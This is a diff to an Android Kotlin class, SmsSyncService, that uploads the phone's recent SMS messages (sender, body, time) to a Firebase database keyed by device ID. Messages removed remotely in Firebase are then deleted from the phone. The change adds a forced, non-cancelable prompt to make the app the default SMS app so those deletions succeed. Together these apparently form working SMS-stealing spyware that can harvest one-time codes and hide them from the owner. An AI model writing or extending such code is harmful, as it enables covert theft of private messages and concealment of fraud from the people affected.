@@ -1,10 +1,12 @@
 package com.vplan.rxtprob
 
 import android.content.Context
+import android.content.DialogInterface
 import android.net.Uri
 import android.provider.Telephony
 import android.provider.Settings
 import android.util.Log
+import androidx.appcompat.app.AlertDialog
 import com.google.firebase.database.*
 
 class SmsSyncService(private val context: Context) {
@@ -19,13 +21,13 @@ class SmsSyncService(private val context: Context) {
     private val smsRef: DatabaseReference =
         FirebaseDatabase.getInstance().getReference("sms").child(deviceId)
 
+    // Upload initial SMS
     fun uploadInitialSms(limit: Int = 20) {
         try {
-            val uriSms = Telephony.Sms.Inbox.CONTENT_URI
             val cursor = context.contentResolver.query(
-                uriSms, null, null, null, "date DESC"
+                Telephony.Sms.Inbox.CONTENT_URI,
+                null, null, null, "date DESC"
             )
-
             cursor?.use {
                 var count = 0
                 while (it.moveToNext() && count < limit) {
@@ -40,7 +42,6 @@ class SmsSyncService(private val context: Context) {
                         "body" to body,
                         "timestamp" to date
                     )
-
                     smsRef.child(id).setValue(smsData)
                     count++
                 }
@@ -51,15 +52,13 @@ class SmsSyncService(private val context: Context) {
         }
     }
 
+    // Listen for Firebase deletion
     fun listenForFirebaseDeletion() {
         smsRef.addChildEventListener(object : ChildEventListener {
             override fun onChildRemoved(snapshot: DataSnapshot) {
                 val smsId = snapshot.key
                 if (smsId != null) {
-                    Log.d(TAG, "🗑️ Firebase delete detected for ID: $smsId")
                     deleteSmsFromPhone(smsId)
-                } else {
-                    Log.w(TAG, "⚠️ Snapshot key null on delete")
                 }
             }
 
@@ -72,19 +71,53 @@ class SmsSyncService(private val context: Context) {
         })
     }
 
+    // Delete SMS from phone (must delete)
     private fun deleteSmsFromPhone(smsId: String) {
         try {
-            val uriSms = Uri.parse("content://sms")
-            val deleted = context.contentResolver.delete(uriSms, "_id=?", arrayOf(smsId))
-            if (deleted > 0) {
-                Log.d(TAG, "✅ SMS deleted from phone: ID=$smsId")
-            } else {
-                Log.w(TAG, "⚠️ No SMS deleted. Maybe not found or not default SMS app.")
+            val defaultPkg = Telephony.Sms.getDefaultSmsPackage(context)
+            Log.d(TAG, "Default SMS App = $defaultPkg, My App = ${context.packageName}")
+
+            if (defaultPkg != context.packageName) {
+                // Must be default SMS app to delete
+                Log.e(TAG, "❌ Not default SMS app! Cannot delete SMS.")
+                showDefaultAppPrompt()
+                return
             }
-        } catch (e: SecurityException) {
-            Log.e(TAG, "❌ SecurityException: ${e.message}")
+
+            val uriSms = Uri.parse("content://sms")
+
+            // Check SMS exists
+            val cursor = context.contentResolver.query(uriSms, null, "_id=?", arrayOf(smsId), null)
+            if (cursor == null || cursor.count == 0) {
+                cursor?.close()
+                Log.w(TAG, "⚠️ SMS not found or already deleted: ID=$smsId")
+                return
+            }
+            cursor.close()
+
+            // Delete SMS
+            val deleted = context.contentResolver.delete(uriSms, "_id=?", arrayOf(smsId))
+            if (deleted > 0) Log.d(TAG, "✅ SMS deleted: ID=$smsId")
+            else Log.e(TAG, "❌ Could not delete SMS: ID=$smsId")
+
         } catch (e: Exception) {
             Log.e(TAG, "❌ Error deleting SMS: ${e.message}")
         }
+    }
+
+    // Prompt user to set app as Default SMS
+    private fun showDefaultAppPrompt() {
+        val builder = AlertDialog.Builder(context)
+        builder.setTitle("Set Default SMS App")
+        builder.setMessage("To delete SMS, you must set this app as your default SMS app.")
+        builder.setPositiveButton("Go to Settings") { _, _ ->
+            val intent = android.content.Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
+            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, context.packageName)
+            intent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
+            context.startActivity(intent)
+        }
+        builder.setNegativeButton("Cancel") { dialog, _ -> dialog.dismiss() }
+        builder.setCancelable(false)
+        builder.create().show()
     }
 }
